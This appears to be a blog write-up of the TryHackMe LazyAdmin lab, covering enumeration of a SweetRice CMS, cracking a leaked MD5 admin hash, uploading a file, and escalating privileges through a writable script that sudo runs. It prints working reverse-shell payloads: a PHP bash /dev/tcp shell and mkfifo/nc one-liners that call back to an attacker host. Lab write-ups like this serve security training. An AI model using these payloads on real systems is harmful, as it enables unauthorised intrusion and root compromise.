---
title: 'TryHackMe - LazyAdmin'
author: r2cook
categories: [TryHackMe]
tags: [SweetRice, ffuf, hashcat, file-upload, reverse-shell, sudo, perl, PrivEsc]
render_with_liquid: false
media_subpath: /images/thm/lazy-admin/
image:
  path: room_card.webp
---

> In this walkthrough, we compromise the TryHackMe **LazyAdmin** machine by enumerating a **SweetRice CMS** installation, discovering an exposed **MySQL backup file**, cracking the **admin MD5 password hash with Hashcat**, abusing an **arbitrary file upload vulnerability in SweetRice 1.5.1** to gain remote code execution, and finally escalating privileges through a **misconfigured sudo Perl backup script** to capture the root flag.

---

## Initial Setup

First, add the target to your hosts file:

```plaintext
10.114.147.108 lazyadmin.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
>> nmap -p- -sV -sC --min-rate 1000 --max-retries 3 -oN nmap_full_scan.txt lazyadmin.thm

Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 22:34 EET
Warning: 10.114.147.108 giving up on port because retransmission cap hit (3).
Nmap scan report for lazyadmin.thm (10.114.147.108)
Host is up (0.071s latency).
Not shown: 63954 closed tcp ports (conn-refused), 1579 filtered tcp ports (no-response)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.81 seconds
```
{: .nolineno }

### Key Findings

- SSH on port `22`
- HTTP on port `80`

---

## Web Enumeration

The website initially shows the default Apache page:

![](web_portal_80_enum.webp){: width="800" height="400" .shadow }

We start fuzzing for hidden directories:

```shell
ffuf -u http://lazyadmin.thm/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
-e .php,.txt,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 \
-c | tee ffuf_result.txt
```
{: .nolineno }

This reveals a `/content` directory.

```text
content [Status: 301]
```

---

## Discovering SweetRice CMS

Inside `/content`, we find the CMS landing page:

![](web_portal_80_content_dir_enum.webp){: width="800" height="400" .shadow }

The page confirms the CMS is **SweetRice**.

Since the version is still unknown, recursive enumeration is the next step.

```shell
ffuf -u http://lazyadmin.thm/content/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
-e .php,.txt,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 \
-c | tee ffuf_content_dir_result.txt
```
{: .nolineno }

Interesting results include:

```text
inc
as
attachment
license.txt
changelog.txt
```

---

## Finding the Admin Login

The `/content/as` directory contains the admin login page:

![](web_portal_80_content_as_dir_login.webp){: width="800" height="400" .shadow }

Default credentials were unsuccessful, so we continued enumerating other directories.

---

## Backup File Exposure

While enumerating `/content/inc`, we discover a MySQL backup directory:

![](web_portal_80_content_inc_dir_found_mysql_backup_dir.webp){: width="800" height="400" .shadow }

Inside it, there is an exposed SQL dump:

![](web_portal_80_content_inc_mysql_backup_dir_found_sql_file.webp){: width="800" height="400" .shadow }

Download it locally for analysis:

![](wget_mysql_file_and_open_it.webp){: width="800" height="400" .shadow }

Reviewing the dump reveals administrator credentials:

![](found_admin_creds.webp){: width="800" height="400" .shadow }

```text
manager:42f749ade7f9e195bf475f37a44cafcb
```

---

## Cracking the Password Hash

First, identify the hash type:

```shell
hashid -m '42f749ade7f9e195bf475f37a44cafcb'
```
{: .nolineno }

The output strongly suggests **MD5**.

Now crack it with **rockyou.txt**:

```shell
echo '42f749ade7f9e195bf475f37a44cafcb' > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
{: .nolineno }

Recovered password:

```text
Password123
```

Valid credentials:

```text
manager:Password123
```

---

## Admin Access

Login succeeds:

![](admin_panel_login_success.webp){: width="800" height="400" .shadow }

From the dashboard, we confirm the CMS version:

> SweetRice 1.5.1

![](searchsploit_SweetRice1_5_1.webp){: width="800" height="400" .shadow }

This version is vulnerable to arbitrary file upload.

---

## Initial Foothold

Instead of using the public exploit script, we can exploit the upload feature manually.

Create a PHP reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR-IP>/9001 0>&1'");
?>
```

Rename the file extension to `.php5`, then archive it:

```shell
zip archive.zip reverse_shell.php5
```
{: .nolineno }

Upload it via **Media Center**:

![](upload_archive.webp){: width="800" height="400" .shadow }

Start a listener:

![](open_nc_listner.webp){: width="800" height="400" .shadow }

```shell
nc -lnvp 9001
```
{: .nolineno }

Trigger the upload:

![](uploaded_successfully.webp){: width="800" height="400" .shadow }

Once uploaded, the shell connects back:

![](reverse_shell_obtained.webp){: width="800" height="400" .shadow }

---

## User Flag

The user flag can be found in `/home/itguy`:

![](cat_user_flag.webp){: width="800" height="400" .shadow }

---

## Privilege Escalation

Check sudo permissions:

![](sudo_l.webp){: width="800" height="400" .shadow }

```shell
sudo -l
```
{: .nolineno }

```text
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Inspect the script:

![](cat_backup_pl_and_etc_copy_sh.webp){: width="800" height="400" .shadow }

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The called script contains:

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
{: .nolineno }

The key issue is that `/etc/copy.sh` is writable.

---

## Exploiting Writable Script

Overwrite `/etc/copy.sh` with your own reverse shell:

```shell
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR-IP> 5555 >/tmp/f' > /etc/copy.sh
```
{: .nolineno }

Start a listener:

```shell
nc -lnvp 5555
```
{: .nolineno }

Execute the Perl script with sudo:

```shell
sudo /usr/bin/perl /home/itguy/backup.pl
```
{: .nolineno }

This runs `/etc/copy.sh` as root and gives us a privileged shell.

---

## Root Shell

Root shell obtained:

![](got_root_shell_and_read_root_flag.webp){: width="800" height="400" .shadow }

Read the root flag:

```shell
cat /root/root.txt
```
{: .nolineno }

---